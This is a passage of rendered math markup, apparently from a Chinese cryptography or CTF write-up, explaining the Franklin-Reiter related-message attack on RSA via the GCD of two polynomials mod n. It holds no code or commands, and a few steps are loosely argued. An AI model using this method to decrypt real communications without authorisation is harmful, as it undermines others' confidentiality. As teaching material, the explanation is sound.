class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mn>2</mn></msub><mo>=</mo><mi>m</mi><mo>+</mo><msub><mi>r</mi><mn>2</mn></msub><mo>=</mo><msub><mi>M</mi><mn>1</mn></msub><mo>+</mo><mi>r</mi><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><msub><mi>M</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">M_{2}=m+r_{2}=M_{1}+r=f(M_{1})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>X</mi><mi>e</mi></msup><mo>−</mo><mi>c</mi><mn>1</mn><mo>≡</mo><mn>0</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">X^{e}-c1\equiv 0(mod\ n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>X</mi><msup><mo stretchy="false">)</mo><mi>e</mi></msup><mo>−</mo><mi>c</mi><mn>2</mn><mo>≡</mo><mn>0</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(X)^{e}-c2\equiv 0(mod\ n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>对于这两个多项式，有一个公共解：</mtext><msub><mi>M</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">对于这两个多项式，有一个公共解：M_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">于</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">两</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">公</span><span class="mord cjk_fallback">共</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">：</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>多项式除法的基本定理，即因子定理</mtext></mrow><annotation encoding="application/x-tex">多项式除法的基本定理，即因子定理</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">除</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">基</span><span class="mord cjk_fallback">本</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">即</span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">子</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">理</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>如果</mtext><mi>P</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mtext>是一个多项式，且</mtext><msub><mi>M</mi><mn>1</mn></msub><mtext>是一个数使得</mtext><mi>P</mi><mo stretchy="false">(</mo><msub><mi>M</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn><mtext>，那么</mtext><mi>X</mi><mtext>−</mtext><msub><mi>M</mi><mn>1</mn></msub><mtext>是</mtext><mi>P</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mtext>的一个因子</mtext></mrow><annotation encoding="application/x-tex">如果P(X)是一个多项式，且M_{1}是一个数使得P(M_{1})=0，那么X−M_{1}是P(X)的一个因子</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">且</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">得</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">么</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">−</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">是</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">子</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>即，存在另一个多项式</mtext><mi>Q</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mtext>，使得</mtext><mi>P</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>X</mi><mo>−</mo><msub><mi>M</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mi>Q</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">即，存在另一个多项式Q(X)，使得P(X)=(X-M_{1})Q(X)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">即</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">另</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord mathnormal">Q</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">得</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal">Q</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>那么有，</mtext><mo stretchy="false">(</mo><mi>X</mi><mo>−</mo><msub><mi>M</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mi>Q</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>≡</mo><mn>0</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">那么有，(X-M_{1})Q(X_{1})\equiv 0(mod\ n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">么</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">，</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal">Q</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>X</mi><mo>−</mo><msub><mi>M</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mi>Q</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>≡</mo><mn>0</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(X-M_{1})Q(X_{2})\equiv 0(mod\ n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal">Q</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>根据单调性可知，方程有唯一解</mtext><msub><mi>M</mi><mn>1</mn></msub><mtext>，则</mtext><mi>Q</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mtext>不可再因式分解，彼此互素</mtext></mrow><annotation encoding="application/x-tex">根据单调性可知，方程有唯一解M_{1}，则Q(X_{i})不可再因式分解，彼此互素</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">根</span><span class="mord cjk_fallback">据</span><span class="mord cjk_fallback">单</span><span class="mord cjk_fallback">调</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">知</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">程</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">唯</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">解</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">则</span><span class="mord mathnormal">Q</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">再</span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">彼</span><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">互</span><span class="mord cjk_fallback">素</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>对俩多项式</mtext><mi>G</mi><mi>C</mi><mi>D</mi><mtext>，得到</mtext><mi>X</mi><mo>−</mo><msub><mi>M</mi><mn>1</mn></msub><mtext>，但模</mtext><mi>n</mi><mtext>的情况下，得到</mtext><mi>X</mi><mo>+</mo><msup><mi>M</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mtext>的形式</mtext></mrow><annotation encoding="application/x-tex">对俩多项式GCD，得到X-M_{1}，但模n的情况下，得到X+M&#x27;的形式</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">俩</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">但</span><span class="mord cjk_fallback">模</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">情</span><span class="mord cjk_fallback">况</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">形</span><span class="mord cjk_fallback">式</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>M</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mo>−</mo><msub><mi>M</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo stretchy="false">)</mo><mtext>，最终，</mtext><mi>M</mi><mo>=</mo><mo>−</mo><msup><mi>M</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo 